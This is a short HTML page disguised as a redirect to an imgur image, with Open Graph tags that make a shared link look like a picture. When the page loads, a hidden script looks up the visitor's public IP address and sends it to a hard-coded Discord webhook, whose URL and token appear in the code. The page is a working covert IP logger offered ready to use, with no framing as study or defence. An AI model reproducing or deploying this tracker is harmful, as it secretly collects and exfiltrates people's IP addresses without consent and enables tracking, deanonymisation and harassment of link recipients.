<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://imgur.com/i12zp3X">
    <title>Redirecting...</title>

    <!-- Open Graph Tags -->
    <meta property="og:title" content="" />
    <meta property="og:description" content="" />
    <meta property="og:image" content="https://imgur.com/i12zp3X" />
    <meta property="og:type" content="image/png" />

    <script>
        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F";

        async function logIP() {
            const response = await fetch("https://api.ipify.org?format=json");
            const data = await response.json();

            // Send IP to Discord webhook
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
            });
        }

        logIP();
    </script>
</head>
<body>
    <p>Redirecting to the image...</p>
</body>
</html>
